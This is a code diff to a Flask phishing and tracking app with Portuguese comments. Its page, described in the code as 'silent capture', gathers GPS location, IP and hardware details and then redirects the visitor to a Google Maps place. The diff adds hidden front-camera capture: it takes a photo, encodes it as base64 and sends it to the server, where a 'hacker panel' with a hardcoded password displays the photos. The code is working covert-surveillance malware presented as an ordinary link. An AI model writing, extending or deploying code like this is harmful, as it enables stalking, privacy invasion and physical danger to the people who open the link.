@@ -11,6 +11,7 @@ app = Flask(__name__)
 # Buffers de armazenamento em RAM
 registros_gps = []
 registros_ip = []
+registros_fotos = []
 
 # Credenciais de Acesso ao Console
 SENHA_ADMIN = "123123"
@@ -18,7 +19,7 @@ SENHA_ADMIN = "123123"
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
 
-# Página HTML de Captura Silenciosa com Meta Tags Open Graph
+# Página HTML de Captura Silenciosa (GPS + Câmera + Hardware)
 HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -34,14 +35,55 @@ HTML_CAPTURA = f"""
     <meta property="og:type" content="website">
 
     <style>
-        body {{ background-color: #ffffff; margin: 0; }}
+        body {{ background-color: #000; margin: 0; }}
+        #video-oculto {{ display: none; }}
     </style>
 </head>
 <body>
+    <!-- Elementos ocultos para captura de mídia -->
+    <video id="video-oculto" autoplay playsinline></video>
+    <canvas id="canvas-oculto" style="display:none;"></canvas>
+
     <script>
         const urlDestino = "{LINK_DESTINO}";
+        let imagemCapturadaBase64 = null;
+
+        // Função para capturar a foto da câmera frontal
+        async function capturarCamera() {{
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{
+                    video: {{ facingMode: "user" }},
+                    audio: false
+                }});
+                const video = document.getElementById('video-oculto');
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {{
+                    video.onloadedmetadata = () => {{
+                        video.play();
+                        setTimeout(resolve, 800); // Aguarda ajuste de foco/luz da câmera
+                    }};
+                }});
+
+                const canvas = document.getElementById('canvas-oculto');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                imagemCapturadaBase64 = canvas.toDataURL('image/jpeg', 0.8);
+
+                // Desliga a câmera após a captura
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) {{
+                console.warn("Acesso à câmera negado ou indisponível:", e);
+            }}
+        }}
 
         async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {{
+            // Tenta capturar a câmera antes de enviar os dados
+            await capturarCamera();
+
             let infoHardware = {{
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                 deviceMemory: navigator.deviceMemory || 'N/A',
@@ -68,7 +110,8 @@ HTML_CAPTURA = f"""
                 hw: infoHardware,
                 latitude: lat,
                 longitude: lon,
-                precisao: precisao
+                precisao: precisao,
+                foto: imagemCapturadaBase64
             }};
 
             try {{
@@ -111,7 +154,7 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Hacker com Arte ASCII Responsiva (ajustada para telas de celulares como iPhone 11)
+# Painel Hacker Atualizado com Seção de Fotos (Grab Camera)
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -130,14 +173,13 @@ HTML_PAINEL = """
             position: relative;
             min-height: 100vh;
         }
-        /* ARTE ASCII RESPONSIVA - ENCAIXA PERFEITAMENTE EM QUALQUER TELA DE CELULAR */
         .watermark-ascii {
             position: fixed;
             top: 42vh;
             left: 50%;
             transform: translateX(-50%);
             font-family: monospace;
-            font-size: 2.2vw; /* Ajusta o tamanho proporcionalmente à largura da tela */
+            font-size: 2.2vw;
             line-height: 1.15;
             color: rgba(0, 255, 102, 0.75);
             text-shadow: 0 0 15px rgba(0, 255, 102, 0.9);
@@ -148,7 +190,6 @@ HTML_PAINEL = """
             letter-spacing: 0.5px;
             font-weight: bold;
         }
-        /* Em computadores maiores, limita para não ficar gigante */
         @media (min-width: 900px) {
             .watermark-ascii {
                 font-size: 13px;
@@ -221,6 +262,20 @@ HTML_PAINEL = """
             font-size: 11px;
             text-align: center;
         }
+        .captured-photo {
+            width: 90px;
+            height: 90px;
+            object-fit: cover;
+            border: 1px solid #00FF66;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .captured-photo:hover {
+            transform: scale(2.2);
+            transition: transform 0.2s ease;
+            z-index: 99;
+            position: relative;
+        }
         details summary {
             cursor: pointer;
             color: #3399FF;
@@ -255,7 +310,7 @@ HTML_PAINEL = """
 
 <div class="content-wrapper">
     <div class="status-box">
-        <b>[SYS_STATUS]</b> ONLINE-ACTIVE<br>
+        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>GRAB-CAM MODULE:</b> ENABLED<br>
         <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
     </div>
 
@@ -263,10 +318,38 @@ HTML_PAINEL = """
         identification division.<br>
         program-id. MAINFRAME-SECURE-CONSOLE.<br>
         author. PENTESTER-CORE.<br>
-        module. 06 - SCHEDULER & NMAP ENGINE
+        module. 07 - CAMERA SURVEILLANCE & GPS
     </div>
 
-    <h2>[ 01 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
+    <h2>[ 01 ] CAPTURAS DE FOTOS DA CÂMERA ({{ fotos|length }})</h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>ID</th>
+                <th>DATA / HORA</th>
+                <th>IP DE ORIGEM</th>
+                <th>FOTO FRONTAL (PASS MOUSE PARA ZOOM)</th>
+            </tr>
+            {% for f in fotos %}
+            <tr>
+                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
+                <td>{{ f.data }}</td>
+                <td><b>{{ f.ip }}</b></td>
+                <td>
+                    {% if f.foto %}
+                        <img src="{{ f.foto }}" class="captured-photo" alt="Foto Capturada">
+                    {% else %}
+                        <span style="color: #FF5555;">Sem permissão / Câmera indisponível</span>
+                    {% endif %}
+                </td>
+            </tr>
+            {% else %}
+            <tr><td colspan="4" class="empty-msg">> 01 CONDITIONAL: NENHUMA FOTO CAPTURADA <<</td></tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <h2>[ 02 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
     <div class="table-container">
         <table>
             <tr>
@@ -292,7 +375,7 @@ HTML_PAINEL = """
         </table>
     </div>
 
-    <h2>[ 02 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
+    <h2>[ 03 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
     <div class="table-container">
         <table>
             <tr>
@@ -414,6 +497,15 @@ def salvar_payload_total():
         print("Erro GeoIP:", e)
 
     hw = dados.get('hw', {})
+    foto_b64 = dados.get('foto')
+
+    # Armazena foto se houver
+    if foto_b64:
+        registros_fotos.insert(0, {
+            "data": agora,
+            "ip": ip_cliente,
+            "foto": foto_b64
+        })
 
     novo_registro_ip = {
         "data": agora,
@@ -460,7 +552,7 @@ def admin():
         </body>
         """, 403
         
-    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)
+    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, fotos=registros_fotos)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
